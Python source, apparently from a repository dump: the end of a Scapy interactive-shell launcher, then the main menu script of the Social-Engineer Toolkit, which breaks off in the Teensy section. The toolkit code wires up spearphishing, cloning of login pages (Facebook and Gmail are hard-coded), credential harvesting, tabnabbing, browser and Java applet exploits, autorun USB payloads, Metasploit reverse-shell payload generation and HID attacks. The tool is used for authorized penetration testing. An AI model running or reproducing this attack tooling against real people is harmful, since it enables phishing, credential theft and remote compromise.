#        if scapy_module.endswith(".py"):
#            scapy_module = scapy_module[:-3]
#
#    scapy=imp.load_module("scapy",*imp.find_module(scapy_module))


    import __builtin__
#    __builtin__.__dict__.update(scapy.__dict__)
    __builtin__.__dict__.update(globals())
    if mydict is not None:
        __builtin__.__dict__.update(mydict)


    import re, atexit
    try:
        import rlcompleter,readline
    except ImportError:
        log_loading.info("Can't load Python libreadline or completer")
        READLINE=0
    else:
        READLINE=1
        class ScapyCompleter(rlcompleter.Completer):
            def global_matches(self, text):
                matches = []
                n = len(text)
                for lst in [dir(__builtin__), session.keys()]:
                    for word in lst:
                        if word[:n] == text and word != "__builtins__":
                            matches.append(word)
                return matches


            def attr_matches(self, text):
                m = re.match(r"(\w+(\.\w+)*)\.(\w*)", text)
                if not m:
                    return
                expr, attr = m.group(1, 3)
                try:
                    object = eval(expr)
                except:
                    object = eval(expr, session)
                if isinstance(object, Packet) or isinstance(object, Packet_metaclass):
                    words = filter(lambda x: x[0]!="_",dir(object))
                    words += [x.name for x in object.fields_desc]
                else:
                    words = dir(object)
                    if hasattr( object,"__class__" ):
                        words = words + rlcompleter.get_class_members(object.__class__)
                matches = []
                n = len(attr)
                for word in words:
                    if word[:n] == attr and word != "__builtins__":
                        matches.append("%s.%s" % (expr, word))
                return matches

        readline.set_completer(ScapyCompleter().complete)
        readline.parse_and_bind("C-o: operate-and-get-next")
        readline.parse_and_bind("tab: complete")


    session=None
    session_name=""
    CONFIG_FILE = DEFAULT_CONFIG_FILE

    iface = None
    try:
        opts=getopt.getopt(argv[1:], "hs:Cc:")
        for opt, parm in opts[0]:
            if opt == "-h":
                usage()
            elif opt == "-s":
                session_name = parm
            elif opt == "-c":
                CONFIG_FILE = parm
            elif opt == "-C":
                CONFIG_FILE = None

        if len(opts[1]) > 0:
            raise getopt.GetoptError("Too many parameters : [%s]" % string.join(opts[1]),None)


    except getopt.GetoptError, msg:
        log_loading.error(msg)
        sys.exit(1)


    if CONFIG_FILE:
        read_config_file(CONFIG_FILE)

    if session_name:
        try:
            os.stat(session_name)
        except OSError:
            log_loading.info("New session [%s]" % session_name)
        else:
            try:
                try:
                    session = cPickle.load(gzip.open(session_name,"rb"))
                except IOError:
                    session = cPickle.load(open(session_name,"rb"))
                log_loading.info("Using session [%s]" % session_name)
            except EOFError:
                log_loading.error("Error opening session [%s]" % session_name)
            except AttributeError:
                log_loading.error("Error opening session [%s]. Attribute missing" %  session_name)

        if session:
            if "conf" in session:
                conf.configure(session["conf"])
                session["conf"] = conf
        else:
            conf.session = session_name
            session={"conf":conf}

    else:
        session={"conf": conf}

    __builtin__.__dict__["scapy_session"] = session


    if READLINE:
        if conf.histfile:
            try:
                readline.read_history_file(conf.histfile)
            except IOError:
                pass
        atexit.register(scapy_write_history_file,readline)

    sys.ps1 = ColorPrompt()
    code.interact(banner = the_banner % (VERSION), local=session)

    if conf.session:
        save_session(conf.session, session)

    sys.exit()


def read_config_file(configfile):
    try:
        execfile(configfile)
    except IOError,e:
        log_loading.warning("Cannot read config file [%s] [%s]" % (configfile,e))
    except Exception,e:
        log_loading.exception("Error during evaluation of config file [%s]" % configfile)


if __name__ == "__main__":
    interact()
else:
    if DEFAULT_CONFIG_FILE:
        read_config_file(DEFAULT_CONFIG_FILE)

########NEW FILE########
__FILENAME__ = set
#!/usr/bin/env python
#########################################
#
# The Social-Engineer Toolkit
# Written by: David Kennedy (ReL1K)
#
###############################################
import shutil
import os
import time
import re
import sys
import socket
from src.core.setcore import *
from src.core.menu import text

me = mod_name()
###############################################
# Define path and set it to the SET root dir
###############################################

definepath = os.getcwd()
sys.path.append(definepath)

################################################
# ROOT CHECK
################################################

# grab the operating system
operating_system = check_os()

# grab metasploit path
msf_path = meta_path()

if operating_system == "posix":
    if os.geteuid() != 0:
        print "\n The Social-Engineer Toolkit (SET) - by David Kennedy (ReL1K)"
        print "\n Not running as root. \n\nExiting the Social-Engineer Toolkit (SET).\n"
        sys.exit(1)

define_version = get_version()

try:
    while 1:
        show_banner(define_version, '1')

       ###################################################
       #        USER INPUT: SHOW MAIN MENU               #
       ###################################################
        debug_msg(me, "printing 'text.main'", 5)
        show_main_menu = create_menu(text.main_text, text.main)

        # special case of list item 99
        print '\n  99) Return back to the main menu.\n'

        main_menu_choice = (raw_input(setprompt("0", "")))

        if main_menu_choice == 'exit':
            break

        if operating_system == "windows" or msf_path == False:
            if main_menu_choice == "1" or main_menu_choice == "4" or main_menu_choice == "8" or main_menu_choice == "3":
                print_warning("Sorry. This feature is not yet supported in Windows or Metasploit was not found.")
                return_continue()
                break

        if main_menu_choice == '1': #'Spearphishing Attack Vectors
            while 1:

             ###################################################
             #        USER INPUT: SHOW SPEARPHISH MENU         #
             ###################################################


                if operating_system != "windows":
                    debug_msg(me, "printing 'text.spearphish_menu'", 5)
                    show_spearphish_menu = create_menu(text.spearphish_text, text.spearphish_menu)
                    spearphish_menu_choice = raw_input(setprompt(["1"], ""))

                    if spearphish_menu_choice == 'exit':
                        exit_set()

                    if spearphish_menu_choice == 'help':
                        print text.spearphish_text

                    # Spearphish menu choice 1: Perform a Mass Email Attack
                    if spearphish_menu_choice == '1':
                        sys.path.append("src/core/msf_attacks/")
                        debug_msg(me, "importing 'src.core.msf_attacks.create_payload'", 1)
                        try:
                            reload(create_payload)
                        except:
                            pass
                        import create_payload
                    # Spearphish menu choice 2: Create a FileFormat Payload
                    if spearphish_menu_choice == '2':
                        sys.path.append("src/core/msf_attacks/")
                        debug_msg(me, "importing 'src.core.msf_attacks.create_payload'", 1)
                        try:
                            reload(create_payload)
                        except:
                            import create_payload
                    #Spearphish menu choice 3: Create a Social-Engineering Template
                    if spearphish_menu_choice == '3':
                        debug_msg(me, "calling function 'custom_template' from 'src.core.setcore'", 3)
                        custom_template()
                    #Spearphish menu choice 99
                    if spearphish_menu_choice == '99': break

 #####################
 # Web Attack Menu
 #####################
        # Main Menu choice 2: Website Attack Vectors
        if main_menu_choice == '2':
            while 1:

    ###################################################
    #        USER INPUT: SHOW WEB ATTACK MENU         #
    ###################################################

                debug_msg(me, "printing 'text.webattack_menu'", 5)
                show_webattack_menu = create_menu(text.webattack_text, text.webattack_menu)
                attack_vector = raw_input(setprompt(["2"], ""))
                choice3 = ""
                if attack_vector == 'exit':
                    exit_set()

                if attack_vector == "":
                    debug_msg(me, "no attack vector entered, defaulting to '1) Java Applet Attack Method'", 3)
                    attack_vector = "1"

                # check unsupported features
                if operating_system == "windows" or msf_path == False:
                    if attack_vector == "2" or attack_vector == "9":
                        print_warning("Sorry. This option is not yet available in Windows or Metasploit was not found.")
                        return_continue()
                        break

                # full screen attack vector
                if attack_vector == '7':
                    # dont need site cloner
                    site_cloned = False
                    # skip nat section and exit out
                    choice3 = "-1"
                    sys.path.append("src/webattack/fsattack")
                    debug_msg(me, "importing 'src.webattack.fsaattack'", 1)
                    try:
                        reload(full)
                    except:
                        import full

                # Web Attack menu choice 9: Return to the Previous Menu
                if attack_vector == '99': break

                try:
                    attack_check = int(attack_vector)
                except:
                    print_error("ERROR:Invalid selection, going back to menu.")
                    break
                if attack_check > 9:
                    print_warning("Invalid option")
                    return_continue()
                    break

                # Removed to delete MLITM
                if attack_vector != "99999":

                    ###################################################
                    #     USER INPUT: SHOW WEB ATTACK VECTORS MENU    #
                    ###################################################

                    if attack_vector != "7":
                        debug_msg(me, "printing 'text.webattack_vectors_menu'", 5)
                        show_webvectors_menu = create_menu(text.webattack_vectors_text, text.webattack_vectors_menu)
                        print '  99) Return to Webattack Menu\n'
                        choice3 = raw_input(setprompt(["2"], ""))

                        if choice3 == 'exit':
                            exit_set()

                        if choice3 == "99": break

                        if choice3 == "quit" or choice3 == '4': break


                try:
                    # write our attack vector to file to be called later
                    os.chdir(definepath)
                    filewrite = file(setdir + "/attack_vector","w")

                    # webjacking and web templates are not allowed
                    if attack_vector == "5" and choice3 == "1":
                        print bcolors.RED+ "\n Sorry, you can't use the Web Jacking vector with Web Templates."+ bcolors.ENDC
                        return_continue()
                        break

                    # if we select multiattack, web templates are not allowed
                    if attack_vector == "6" and choice3 == "1":
                        print bcolors.RED+ "\n Sorry, you can't use the Multi-Attack vector with Web Templates." + bcolors.ENDC
                        return_continue()
                        break

                    # if we select web template and tabnabbing, throw this error and bomb out to menu
                    if attack_vector == "4" and choice3 == "1":
                        print bcolors.RED+ "\n Sorry, you can only use the cloner option with the tabnabbing method." + bcolors.ENDC
                        return_continue()
                        break

                    # if attack vector is default or 1 for java applet
                    if attack_vector == '': attack_vector = '1'
                    # specify java applet attack
                    if attack_vector == '1':
                        attack_vector = "java"
                        filewrite.write(attack_vector)
                        filewrite.close()

                    # specify browser exploits
                    if attack_vector == '2':
                        attack_vector = "browser"
                        filewrite.write(attack_vector)
                        filewrite.close()

                    if attack_vector == '': attack_vector = '3'
                    # specify web harvester method
                    if attack_vector == '3':
                        attack_vector = "harvester"
                        filewrite.write(attack_vector)
                        filewrite.close()
                        print_info("Credential harvester will allow you to utilize the clone capabilities within SET")
                        print_info("to harvest credentials or parameters from a website as well as place them into a report")

                    # specify tab nabbing attack vector
                    if attack_vector == '4':
                        attack_vector = "tabnabbing"
                        filewrite.write(attack_vector)
                        filewrite.close()

                    # specify webjacking attack vector
                    if attack_vector == "5":
                        attack_vector = "webjacking"
                        filewrite.write(attack_vector)
                        filewrite.close()

                    # specify Multi-Attack Vector
                    attack_vector_multi = ""
                    if attack_vector == '6':
                        # trigger the multiattack flag in SET
                        attack_vector = "multiattack"
                        # write the attack vector to file
                        filewrite.write(attack_vector)
                        filewrite.close()

                    # pull ip address
                    if choice3 != "-1":
                        fileopen = file("config/set_config", "r").readlines()
                        for line in fileopen:
                            line = line.rstrip()
                            match = re.search("AUTO_DETECT=ON", line)
                            if match:
                                try:
                                    ipaddr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                    ipaddr.connect(('google.com', 0))
                                    ipaddr.settimeout(2)
                                    ipaddr = ipaddr.getsockname()[0]
                                    update_options("IPADDR=" + ipaddr)
                                except Exception, error:
                                    log(error)
                                    ipaddr = raw_input(setprompt(["2"], "Your interface IP Address"))
                                    update_options("IPADDR=" + ipaddr)

                        # if AUTO_DETECT=OFF prompt for IP Address
                        for line in fileopen:
                            line = line.rstrip()
                            match = re.search("AUTO_DETECT=OFF", line)
                            if match:
                                if attack_vector != "harvester":
                                    if attack_vector != "tabnabbing":
                                        if attack_vector != "webjacking":
                                            # this part is to determine if NAT/port forwarding is used
                                            # if it is it'll prompt for additional questions
                                            print_info("NAT/Port Forwarding can be used in the cases where your SET machine is")
                                            print_info("not externally exposed and may be a different IP address than your reverse listener.")
                                            nat_or_fwd = yesno_prompt('0', 'Are you using NAT/Port Forwarding [yes|no]')
                                            if nat_or_fwd == "YES":
                                                ipquestion = raw_input(setprompt(["2"], "IP address to SET web server (this could be your external IP or hostname)"))

                                                filewrite2 = file(setdir + "/interface", "w")
                                                filewrite2.write(ipquestion)
                                                filewrite2.close()
                                                # is your payload/listener on a different IP?
                                                natquestion = yesno_prompt(["2"], "Is your payload handler (metasploit) on a different IP from your external NAT/Port FWD address [yes|no]")
                                                if natquestion == 'YES':
                                                    ipaddr = raw_input(setprompt(["2"], "IP address for the reverse handler (reverse payload)"))
                                                if natquestion == "NO":
                                                    ipaddr = ipquestion
                                            # if you arent using NAT/Port FWD
                                            if nat_or_fwd == "NO":
                                                print_info("Enter the IP address of your interface IP or if your using an external IP, what")
                                                print_info("will be used for the connection back and to house the web server (your interface address)")
                                                ipaddr = raw_input(setprompt(["2"], "IP address or hostname for the reverse connection"))
                                                # here we check if they are using a hostname else we loop through until they have a legit one
                                                if validate_ip(ipaddr) == False:
                                                    while 1:
                                                        choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
                                                        if choice == "" or choice.lower() == "y":
                                                            print_status("Roger that. Using hostnames moving forward..")
                                                            break
                                                        else:
                                                            ipaddr = raw_input(setprompt(["2"], "IP address for the reverse connection"))
                                                            if validate_ip(ipaddr) == True: break

                                if attack_vector == "harvester" or attack_vector == "tabnabbing" or attack_vector == "webjacking":
                                    print_info("This option is used for what IP the server will POST to.")
                                    print_info("If you're using an external IP, use your external IP for this")
                                    ipaddr = raw_input(setprompt(["2"], "IP address for the POST back in Harvester/Tabnabbing"))
                                update_options("IPADDR=" + ipaddr)

                        # if java applet attack
                        if attack_vector == "java":
                            applet_choice()

                    # Select SET quick setup
                    if choice3 == '1':

                            # get the template ready
                        sys.path.append("src/html/templates")
                        debug_msg(me, "importing src.html.templates.template'", 1)
                        try:
                            reload(template)
                        except:
                            import template

                        # grab browser exploit selection
                        if attack_vector == "browser":
                                # grab clientattack
                            sys.path.append("src/webattack/browser_exploits")
                            debug_msg(me, "line 357: importing 'src.webattack.browser_exploits.gen_payload'", 1)
                            try:
                                reload(gen_payload)
                            except:
                                import gen_payload

                        # arp cache attack, will exit quickly
                        # if not in config file
                        sys.path.append("src/core/arp_cache")
                        debug_msg(me, "line 364: importing 'src.core.arp_cache.arp'", 1)
                        try:
                            reload(arp)
                        except:
                            import arp

                        # actual website attack here
                        # web_server.py is main core
                        sys.path.append("src/html/")

                        # clean up stale file
                        if os.path.isfile(setdir + "/cloner.failed"):
                            os.remove(setdir + "/cloner.failed")

                        site_cloned = True

                        debug_msg(me, "line 375: importing 'src.webattack.web_clone.cloner'", 1)
                        try: reload(src.webattack.web_clone.cloner)
                        except: import src.webattack.web_clone.cloner

                        # grab java applet attack
                        if attack_vector == "java":
                            debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
                            try: reload(src.core.payloadgen.create_payloads)
                            except: import src.core.payloadgen.create_payloads

                        if os.path.isfile(setdir + "/cloner.failed"):
                            site_cloned = False

                        if site_cloned == True:

                            # cred harvester for auto site here
                            if attack_vector == "harvester" or attack_vector == "tabnabbing" or attack_vector == "webjacking":
                                if attack_vector == "tabnabbing" or attack_vector == "webjacking":
                                    debug_msg(me, "importing 'src.webattack.tabnabbing.tabnabbing'", 1)
                                    try:reload(src.webattack.tabnabbing)
                                    except: import src.webattack.tabnabbing
                                # start web cred harvester here
                                # sys.path.append("src/webattack/harvester")
                                debug_msg(me, "importing 'src.webattack.harvester.harvester'", 1)
                                try: reload(src.webattack.harvester.harvester)
                                except: import src.webattack.harvester.harvester

                            # if we are using profiler lets prep everything to get ready
                            if attack_vector == "profiler":
                                from src.webattack.profiler.webprofiler import *
                                prep_website()

                            if attack_vector != "harvester":
                                if attack_vector != "tabnabbing":
                                    if attack_vector != "multiattack":
                                        if attack_vector != "webjacking":
                                            if attack_vector != "multiattack":
                                                if attack_vector != "profiler":
                                                    # spawn web server here
                                                    debug_msg(me, "importing 'src.html.spawn'", 1)
                                                    import src.html.spawn


                            # multi attack vector here
                            if attack_vector == "multiattack":
                                if choice3 == "1":
                                    try:
                                        filewrite = file("src/progam_junk/multiattack.template","w")
                                        filewrite.write("TEMPLATE=TRUE")
                                        filewrite.close()
                                    except:
                                        pass
                                    debug_msg(me, "importing 'src.webattack.multi_attack.multiattack'", 1)
                                    import src.webattack.multi_attack.multiattack


                    # Create a website clone
                    if choice3 == '2':
                        # flag that we want a custom website
                        sys.path.append("src/webattack/web_clone/")
                        if os.path.isfile(setdir + "/site.template"):
                            os.remove(setdir + "/site.template")
                        filewrite = file(setdir + "/site.template", "w")
                        filewrite.write("TEMPLATE=CUSTOM")
                        print_info("SET supports both HTTP and HTTPS")
                        # specify the site to clone
                        print_info("Example: http://www.thisisafakesite.com")
                        URL = raw_input(setprompt(["2"], "Enter the url to clone"))
                        match = re.search("http://", URL)
                        match1 = re.search("https://", URL)
                        if not match:
                            if not match1:
                                URL = ("http://"+URL)

                        match2 = re.search("facebook.com", URL)
                        if match2:
                            URL = ("https://login.facebook.com/login.php")

                        # changed based on new landing page for gmail.com
                        match3 = re.search("gmail.com", URL)
                        if match3: URL = ("https://accounts.google.com")

                        filewrite.write("\nURL=%s" % (URL))
                        filewrite.close()

                        # grab browser exploit selection
                        if attack_vector == "browser":
                            # grab clientattack
                            sys.path.append("src/webattack/browser_exploits")
                            debug_msg(me, "importing 'src.webattack.browser_exploits.gen_payload'", 1)
                            try:
                                reload(gen_payload)
                            except:
                                import gen_payload

                        # set site cloner to true
                        site_cloned = True

                        if attack_vector != "multiattack":
                            # import our website cloner

                            site_cloned = True
                            debug_msg(me, "importing 'src.webattack.web_clone.cloner'", 1)
                            try:
                                reload(src.webattack.web_clone.cloner)
                            except:
                                import src.webattack.web_clone.cloner

                            if os.path.isfile(setdir + "/cloner.failed"):
                                site_cloned = False

                        if site_cloned == True:

                            if attack_vector == "java":
                                # import our payload generator
                                debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
                                try:
                                    reload(src.core.payloadgen.create_payloads)
                                except:
                                    import src.core.payloadgen.create_payloads

                            # arp cache if applicable
                            sys.path.append("src/core/arp_cache")
                            debug_msg(me, "line 500: importing 'src.core.arp_cache.arp'", 1)
                            try:
                                reload(arp)
                            except:
                                import arp

                            # tabnabbing and harvester selection here
                            if attack_vector == "harvester" or attack_vector == "tabnabbing" or attack_vector == "webjacking":
                                if attack_vector == "tabnabbing" or attack_vector == "webjacking":
                                    sys.path.append("src/webattack/tabnabbing")
                                    debug_msg(me, "importing 'src.webattack.tabnabbing.tabnabbing'", 1)
                                    try:
                                        reload(tabnabbing)
                                    except:
                                        import tabnabbing
                                sys.path.append("src/webattack/harvester")
                                debug_msg(me, "importing 'src.webattack.harvester.harvester'", 1)

                                try:
                                    reload(harvester)
                                except:
                                    import harvester

                            # multi_attack vector here
                            if attack_vector == "multiattack":
                                sys.path.append("src/webattack/multi_attack/")
                                debug_msg(me, "importing 'src.webattack.multi_attack.multiattack'", 1)
                                try:
                                    reload(multiattack)
                                except:
                                    import multiattack

                            # if we arent using credential harvester or tabnabbing
                            if attack_vector != "harvester":
                                if attack_vector != "tabnabbing":
                                    if attack_vector != "multiattack":
                                        if attack_vector != "webjacking":
                                            sys.path.append("src/html")
                                            debug_msg(me, "importing 'src.html.spawn'", 1)
                                            try:
                                                reload(spawn)
                                            except:
                                                import spawn

                    # Import your own site
                    if choice3 == '3':

                        sys.path.append("src/webattack/web_clone/")
                        if os.path.isfile(setdir + "/site.template"):
                            os.remove(setdir + "/site.template")
                        filewrite = file(setdir + "/site.template", "w")
                        filewrite.write("TEMPLATE=SELF")
                        # specify the site to clone
                        if not os.path.isdir(setdir + "/web_clone"):
                            os.makedirs(setdir + "/web_clone")
                        print_warning("Example: /home/website/ (make sure you end with /)")
                        print_warning("Also note that there MUST be an index.html in the folder you point to.")
                        URL = raw_input(setprompt(["2"], "Path to the website to be cloned"))
                        if not URL.endswith("/"):
                            if not URL.endswith("index.html"):
                                URL = URL + "/"
                        if not os.path.isfile(URL+"index.html"):
                            if os.path.isfile(URL):
                                shutil.copyfile("%s" % (URL), setdir + "/web_clone/index.html")
                            if not os.path.isfile(URL):
                                if URL.endswith("index.html"):
                                    shutil.copyfile(URL, "%s/web_clone/index.html" % (setdir))
                                else:
                                    print_error("ERROR:index.html not found!!")
                                    print_error("ERROR:Did you just put the path in, not file?")
                                    print_error("Exiting the Social-Engineer Toolkit...Hack the Gibson.\n")
                                    exit_set()

                        if os.path.isfile(URL+"index.html"):
                            print_status("Index.html found. Do you want to copy the entire folder or just index.html?")
                            choice = raw_input("\n1. Copy just the index.html\n2. Copy the entire folder\n\nEnter choice [1/2]: ")
                            if choice == "1" or choice == "":
                                if os.path.isfile("%s/web_clone/index.html" % (setdir)):
                                    os.remove("%s/web_clone/index.html" % (setdir))
                                shutil.copyfile(URL + "index.html", "%s/web_clone/" % (setdir))
                            if choice == "2":
                                if os.path.isdir(URL + "src/webattack"):
                                    print_error("You cannot specify a folder in the default SET path. This goes into a loop Try something different.")
                                    URL = raw_input("Enter the folder to import into SET, this CANNOT be the SET directory: ")
                                    if os.path.isdir(URL + "src/webattack" % (URL)):
                                        print_error("You tried the same thing. Exiting now.")
                                        sys.exit()
                                copyfolder(URL, "%s/web_clone/" % setdir)

                        filewrite.write("\nURL=%s" % (URL))
                        filewrite.close()

                        # if not harvester then load up cloner
                        if attack_vector == "java" or attack_vector == "browser":
                            # import our website cloner
                            debug_msg(me, "importing 'src.webattack.web_clone.cloner'", 1)
                            import src.webattack.web_clone.cloner

                        # if java applet attack
                        if attack_vector == "java":
                            # import our payload generator

                            debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
                            import src.core.payloadgen.create_payloads

                        # grab browser exploit selection
                        if attack_vector == "browser":
                            # grab clientattack
                            sys.path.append("src/webattack/browser_exploits")
                            debug_msg(me, "importing 'src.webattack.browser_exploits.gen_payload'", 1)
                            try:
                                reload(gen_payload)
                            except:
                                import gen_payload

                        # arp cache if applicable
                        sys.path.append("src/core/arp_cache")
                        debug_msg(me, "line 592: importing 'src.core.arp_cache.arp'", 1)
                        try:
                            reload(arp)
                        except:
                            import arp

                        # if not harvester spawn server
                        if attack_vector == "java" or attack_vector == "browser":
                                # import web_server and do magic
                            sys.path.append("src/html")
                            debug_msg(me, "importing 'src.html.spawn'", 1)
                            try:
                                reload(spawn)
                            except:
                                import spawn

                        # cred harvester for auto site here
                        if attack_vector == "harvester":
                            # get the url
                            print_info("Example: http://www.blah.com")
                            URL = raw_input(setprompt(["2"], "URL of the website you imported"))
                            match = re.search("http://", URL)
                            match1 = re.search("https://", URL)
                            if not match:
                                if not match1:
                                    URL = ("http://"+URL)
                            filewrite = file(setdir + "/site.template","w")
                            filewrite.write("\nURL=%s" % (URL))
                            filewrite.close()

                            # start web cred harvester here
                            sys.path.append("src/webattack/harvester")
                            debug_msg(me, "importing 'src.webattack.harvester.harvester'", 1)
                            try:
                                reload(harvester)
                            except:
                                import harvester

                        # tabnabbing for auto site here
                        if attack_vector == "tabnabbing" or attack_vector == "webjacking":
                            # get the url
                            print_info("Example: http://www.blah.com")
                            URL = raw_input(setprompt(["2"], "URL of the website you imported"))
                            match = re.search("http://", URL)
                            match1 = re.search("https://", URL)
                            if not match:
                                if not match1:
                                    URL = ("http://"+URL)
                            filewrite = file(setdir + "/site.template","w")
                            filewrite.write("\nURL=%s" % (URL))
                            filewrite.close()
                            # start tabnabbing here
                            sys.path.append("src/webattack/tabnabbing")
                            debug_msg(me, "importing 'src.webattack.tabnabbing.tabnabbing'", 1)
                            try:
                                reload(tabnabbing)
                            except:
                                import tabnabbing

                            # start web cred harvester here
                            sys.path.append("src/webattack/harvester")
                            debug_msg(me, "importing 'src.webattack.harvester.harvester'", 1)
                            try:
                                reload(harvester)
                            except:
                                import harvester

                        # multi attack vector here
                        if attack_vector == "multiattack":
                            try:
                                filewrite = file("src/progam_junk/multiattack.template","w")
                                filewrite.write("TEMPLATE=TRUE")
                                filewrite.close()
                            except:
                                pass
                            debug_msg(me, "importing 'src.webattack.multi_attack.multiattack'", 1)
                            import src.webattack.multi_attack.multiattack


                    # Return to main menu
                    if choice3 == '4':
                        print (" Returning to main menu.\n")
                        break
                except KeyboardInterrupt:
                    print " Control-C detected, bombing out to previous menu.."
                    break

        # Define Auto-Infection USB/CD Method here
        if main_menu_choice == '3':

                ###################################################
                #     USER INPUT: SHOW INFECTIOUS MEDIA MENU      #
                ###################################################
                # Main Menu choice 3: Infectious Media Generator
            debug_msg(me, "printing 'text.infectious_menu'", 5)
            show_infectious_menu = create_menu(text.infectious_text, text.infectious_menu)
            infectious_menu_choice = raw_input(setprompt(["3"], ""))

            if infectious_menu_choice == 'exit':
                exit_set()

            if infectious_menu_choice == "99":
                menu_back()

            if infectious_menu_choice == "":
                infectious_menu_choice = "1"

            # if fileformat
            if infectious_menu_choice == "1":
                ipaddr = raw_input(setprompt(["3"], "IP address for the reverse connection (payload)"))
                update_options("IPADDR=" + ipaddr)

            filewrite1 = file(setdir + "/payloadgen", "w")
            filewrite1.write("payloadgen=solo")
            filewrite1.close()

            # if choice is file-format
            if infectious_menu_choice == "1":
                filewrite = file(setdir + "/fileformat.file","w")
                filewrite.write("fileformat=on")
                filewrite.close()
                sys.path.append("src/core/msf_attacks/")
                debug_msg(me, "importing 'src.core.msf_attacks.create_payload'", 1)
                try:
                    reload(create_payload)
                except:
                    import create_payload

            # if choice is standard payload
            if infectious_menu_choice == "2":
                filewrite = file(setdir + "/standardpayload.file", "w")
                filewrite.write("standardpayload=on")
                filewrite.close()
                #sys.path.append("src/core/payloadgen/")
                #try: reload(create_payloads)
                #except: import create_payloads
                debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
                import src.core.payloadgen.create_payloads

            if infectious_menu_choice != "99":
                # import the autorun stuff
                sys.path.append("src/autorun/")
                debug_msg(me, "importing 'src.autorun.autorun'", 1)
                try:
                    reload(autorun)
                except:
                    import autorun

            if infectious_menu_choice == "2":
                sys.path.append("src/core/payloadgen/")
                debug_msg(me, "importing 'src.core.payloadgen.solo'", 1)
                try:
                    reload(solo)
                except:
                    import solo
        #
        #
        # Main Menu choice 4: Create a Payload and Listener
        #
        #
        if main_menu_choice == '4':
            filewrite = file(setdir + "/payloadgen", "w")
            filewrite.write("payloadgen=solo")
            filewrite.close()
            debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
            try: import src.core.payloadgen.create_payloads
            except: reload(src.core.payloadgen.create_payloads)
            print_status("Your payload is now in the root directory of SET as payload.exe")
            if os.path.isfile(setdir + "/meterpreter.alpha"):
                print "[*] Saving alphanumeric shellcode in root directory of SET as meterpreter.alpha"
                shutil.copyfile(setdir + "/meterpreter.alpha", definepath + "/meterpreter.alpha")

            # if we didn't select the SET interactive shell or RATTE
            if not os.path.isfile(setdir + "/set.payload"):
                upx_check = check_config("UPX_ENCODE=")
                if upx_check.lower() == "on":
	                upx("msf.exe")

            # if the set payload is there
            if os.path.isfile(setdir + "/msf.exe"):
                shutil.copyfile(setdir + "/msf.exe", "payload.exe")

            sys.path.append("src/core/payloadgen/")
            debug_msg(me, "importing 'src.core.payloadgen.solo'", 1)
            try:
                reload(solo)
            except:
                import solo
            return_continue()

        # Main Menu choice 5: Mass Mailer Attack
        if main_menu_choice == '5':
            debug_msg(me, "importing 'src.phishing.smtp.client.smtp_web'", 1)
            try: reload(src.phishing.smtp.client.smtp_web)
            except: import src.phishing.smtp.client.smtp_web

        # Main Menu choice 6: Teensy USB HID Attack Vector
        if main_menu_choice == '6':

            ###################################################
            #        USER INPUT: SHOW TEENSY MENU             #
            ###################################################
            debug_msg(me, "printing 'text.teensy_menu'", 5)
            show_teensy_menu = create_menu(text.teensy_text, text.teensy_menu)
            teensy_menu_choice = raw_input(setprompt(["6"], ""))

            if teensy_menu_choice == 'exit':
                exit_set()

            # if not return to main menu
            yes_or_no = ''

            if teensy_menu_choice != "99":
                # set our teensy info file in program junk
                filewrite = file(setdir + "/teensy", "w")
                filewrite.write(teensy_menu_choice+"\n")
                if teensy_menu_choice != "3" and teensy_menu_choice != "7" and teensy_menu_choice !="8" and teensy_menu_choice !="9" and teensy_menu_choice !="10" and teensy_menu_choice != "11" and teensy_menu_choice != "12" and teensy_menu_choice != "13":
                    yes_or_no = yesno_prompt("0","Do you want to create a payload and listener [yes|no]: ")
                    if yes_or_no == "YES":
                        filewrite.write("payload")
                        filewrite.close()
                        # load a payload
                        sys.path.append("src/core/payloadgen")
                        debug_msg(me, "importing 'src.core.payloadgen.create_payloads'", 1)
                        try:
                            reload(create_payloads)
                        except:
                            import create_payloads
                if yes_or_no == "NO":
                    filewrite.close()
                # need these default files for web server load
                filewrite = file(setdir + "/site.template", "w")
                filewrite.write("TEMPLATE=CUSTOM")
                filewrite.close()
                filewrite = file(setdir + "/attack_vector", "w")
                filewrite.write("hid")
                filewrite.close()
                # if we are doing binary2teensy
                if teensy_menu_choice != "7" and teensy_menu_choice !="8" and teensy_menu_choice != "9" and teensy_menu_choice !="10" and teensy_menu_choice != "11" and teensy_menu_choice != "12":
                    sys.path.append("src/teensy")
                    debug_msg(me, "importing 'src.teensy.teensy'", 1)
                    try:
                        reload(teensy)
                    except:
                        import teensy
                if teensy_menu_choice == "7":
                    debug_msg(me, "importing 'src.teensy.binary2teensy'", 1)
                    import src.teensy.binary2teensy
                # if we are doing sd2teensy attack
                if teensy_menu_choice == "8":
                    debug_msg(me, "importing 'src.teensy.sd2teensy'", 1)
                    import src.teensy.sd2teensy

                # if we are doing the sd2teensy osx attack
                if teensy_menu_choice == "9":
                    print_status("Generating the SD2Teensy OSX pde file for you...")
                    if not os.path.isdir(setdir + "/reports/osx_sd2teensy"):
                        os.makedirs(setdir + "/reports/osx_sd2teensy")
                    shutil.copyfile("src/teensy/osx_sd2teensy.pde", "%s/reports/osx_sd2teensy/osx_sd2teensy.pde" % (setdir))
                    print_status("File has been exported to ~/.set/reports/osx_sd2teensy/osx_sd2teensy.pde")
                    return_continue()

                # if we are doing the X10 Arduino Sniffer
                if teensy_menu_choice == "10":
                    print_status("Generating the Arduino sniffer and libraries pde..")
                    if not os.path.isdir(setdir + "/reports/arduino_sniffer"):
                        os.makedirs(setdir + "/reports/arduino_sniffer")
                    shutil.copyfile("src/teensy/x10/x10_sniffer.pde", setdir + "/reports/arduino_sniffer/x10_sniffer.pde")
                    shutil.copyfile("src/teensy/x10/libraries.zip", setdir + "/reports/arduino_sniffer/libraries.zip")
                    print_status("Arduino sniffer files and libraries exported to ~/.set/reports/arduino_sniffer")
                    return_continue()

                # if we are doing the X10 Jammer
                if teensy_menu_choice == "11":
                    print_status("Generating the Arduino jammer pde and libraries...")
                    if not os.path.isdir(setdir + "/reports/arduino_jammer"):
                        os.makedirs(setdir + "/reports/arduino_jammer")
                    shutil.copyfile("src/teensy/x10/x10_blackout.pde", setdir + "/reports/arduino_jammer/x10_blackout.pde")
